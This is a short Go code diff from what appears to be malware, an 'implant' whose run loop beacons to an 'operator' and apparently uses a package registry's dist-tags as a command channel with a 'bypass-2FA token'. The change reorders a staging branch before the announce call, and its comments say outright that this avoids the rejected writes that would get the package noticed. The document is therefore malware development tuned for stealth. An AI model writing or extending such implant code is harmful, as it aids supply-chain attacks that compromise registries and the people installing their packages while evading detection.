@@ -578,14 +578,17 @@ func (im *implant) run() {
 		}
 	}
 	cycle := 0
+	// The staging channel must not touch dist-tags at all: that PUT is 403 for
+	// a bypass-2FA token today, and a rejected write per start is exactly the
+	// noise that gets a package noticed. Branch first, announce after.
+	if im.stageMode {
+		im.runStage()
+		return
+	}
 	// Announce immediately: waiting ten cycles means the operator sees an
 	// empty client list for minutes after a fresh implant starts.
 	if im.token != "" {
 		im.beat()
-	}
-	if im.stageMode {
-		im.runStage()
-		return
 	}
 	for {
 		tags, order, err := im.fetch()
